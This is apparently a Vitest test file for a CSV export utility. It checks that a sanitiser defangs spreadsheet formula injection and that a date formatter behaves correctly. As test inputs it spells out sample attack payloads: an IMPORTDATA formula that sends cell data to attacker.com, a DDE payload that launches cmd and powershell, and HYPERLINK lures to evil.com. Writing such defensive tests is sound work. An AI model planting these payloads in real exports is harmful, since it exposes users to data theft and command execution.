import { describe, it, expect } from 'vitest';
// sanitizeCsvField is added by Fix B. Before that fix this import statement
// will throw "does not provide an export named 'sanitizeCsvField'", making
// every test in this file fail — which is intentional: it documents that the
// export and its sanitisation behaviour must be implemented.
import { sanitizeCsvField, formatDate } from './exportUtils.js';

// ─── sanitizeCsvField ─────────────────────────────────────────────────────────
//
// Fix B adds this exported pure function that strips CSV formula-injection
// triggers by prepending a tab character (\t) to any field value whose first
// character is one of: =  +  -  @  |  \t
//
// All tests in this file are RED before Fix B and GREEN after.

describe('sanitizeCsvField — formula injection prevention (Fix B)', () => {
  // Dangerous prefix characters (OWASP CSV injection list)
  const formulaPrefixes = ['=', '+', '-', '@', '|'];

  formulaPrefixes.forEach((prefix) => {
    it(`prefixes "${prefix}" with \\t to defang formula trigger`, () => {
      const input = `${prefix}HYPERLINK("evil.com","click")`;
      const result = sanitizeCsvField(input);
      expect(result.startsWith('\t')).toBe(true);
    });
  });

  it('prefixes a tab-prefixed value with another tab (double-escape)', () => {
    const input = '\t=already has tab';
    const result = sanitizeCsvField(input);
    expect(result.startsWith('\t')).toBe(true);
  });

  it('does not modify safe field values with no formula prefix', () => {
    expect(sanitizeCsvField('CVE-2024-12345')).toBe('CVE-2024-12345');
    expect(sanitizeCsvField('Remote code execution via buffer overflow')).toBe(
      'Remote code execution via buffer overflow'
    );
    expect(sanitizeCsvField('7.5')).toBe('7.5');
    expect(sanitizeCsvField('High')).toBe('High');
    expect(sanitizeCsvField('Yes')).toBe('Yes');
    expect(sanitizeCsvField('100')).toBe('100');
  });

  it('handles an empty string safely', () => {
    expect(sanitizeCsvField('')).toBe('');
  });

  it('handles null/undefined safely (returns empty string)', () => {
    expect(sanitizeCsvField(null)).toBe('');
    expect(sanitizeCsvField(undefined)).toBe('');
  });

  it('a realistic formula-injection attack payload is defanged', () => {
    const payload = '=IMPORTDATA("https://attacker.com/steal?data="&A1)';
    const result = sanitizeCsvField(payload);
    expect(result[0]).toBe('\t');
    expect(result.slice(1)).toBe(payload); // payload preserved, just prefixed
  });

  it('a DDE-style injection payload is defanged', () => {
    const payload = '+cmd|"/c powershell -c malware"!A0';
    const result = sanitizeCsvField(payload);
    expect(result[0]).toBe('\t');
  });

  it('normal text starting with a letter is unmodified', () => {
    expect(sanitizeCsvField('Normal text')).toBe('Normal text');
  });

  it('numeric strings are unmodified', () => {
    expect(sanitizeCsvField('42')).toBe('42');
    expect(sanitizeCsvField('3.14')).toBe('3.14');
  });
});

// ─── formatDate ───────────────────────────────────────────────────────────────

describe('formatDate', () => {
  it('valid PocketBase ISO string → MM/DD/YYYY (UTC test environment)', () => {
    // PocketBase returns dateAdded as '2026-03-15 18:09:57.642Z'
    // 18:09 UTC is March 15 in all UTC offsets from -17 to +5
    // (UTC-17 does not exist; UTC-12 gives 06:09 = still March 15)
    expect(formatDate('2026-03-15 18:09:57.642Z')).toBe('03/15/2026');
  });

  it('ISO 8601 T-format string → MM/DD/YYYY', () => {
    expect(formatDate('2026-06-20T15:30:00.000Z')).toBe('06/20/2026');
  });

  it('null → "-"', () => {
    expect(formatDate(null)).toBe('-');
  });

  it('undefined → "-"', () => {
    expect(formatDate(undefined)).toBe('-');
  });

  it('empty string → "-"', () => {
    expect(formatDate('')).toBe('-');
  });

  it('malformed string → "-"', () => {
    expect(formatDate('not-a-date')).toBe('-');
  });

  it('midnight UTC produces a valid MM/DD/YYYY string (exact date is timezone-dependent)', () => {
    // At 00:00 UTC, local date differs by timezone — we verify format, not specific value
    const result = formatDate('2026-01-15T00:00:00.000Z');
    expect(result).toMatch(/^\d{2}\/\d{2}\/\d{4}$/);
    expect(result).not.toBe('-');
  });
});
